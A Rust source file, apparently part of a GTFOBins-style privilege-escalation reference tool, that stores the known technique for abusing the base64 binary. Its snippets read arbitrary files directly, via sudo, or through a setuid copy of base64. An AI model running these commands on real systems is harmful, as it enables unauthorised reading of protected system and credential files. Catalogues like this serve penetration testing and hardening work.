
pub static BIN_NAME: &'static str = "base64";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    base64 "$LFILE" | base64 --decode
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which base64) .

    LFILE=file_to_read
    ./base64 "$LFILE" | base64 --decode
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo base64 "$LFILE" | base64 --decode
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
